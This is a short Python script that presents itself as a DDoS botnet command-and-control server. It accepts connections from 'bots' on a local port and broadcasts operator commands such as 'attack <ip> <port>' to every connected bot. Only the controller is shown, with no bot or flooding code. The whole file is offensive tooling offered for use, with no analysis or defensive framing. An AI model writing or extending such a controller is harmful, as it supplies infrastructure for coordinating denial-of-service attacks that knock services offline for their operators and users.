#!/usr/bin/env python3
import socket
import threading

clients = []

def handle_new_bots(server):
    while True:
        client, addr = server.accept()
        print(f"[C2] Bot connected from {addr}")
        clients.append(client)

def broadcast(msg):
    for client in clients:
        try:
            client.send(msg.encode())
        except:
            clients.remove(client)

def start_ddos_c2():
    HOST = '127.0.0.1'
    PORT = 9999

    print(f"[C2] Starting Command & Control server on {HOST}:{PORT}")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)

    threading.Thread(target=handle_new_bots, args=(server,), daemon=True).start()

    while True:
        cmd = input("C2 > Enter command (e.g., attack 127.0.0.1 8080 / exit): ").strip()
        if cmd.lower() == "exit":
            print("[C2] Shutting down...")
            break
        broadcast(cmd)

if __name__ == "__main__":
    start_ddos_c2()
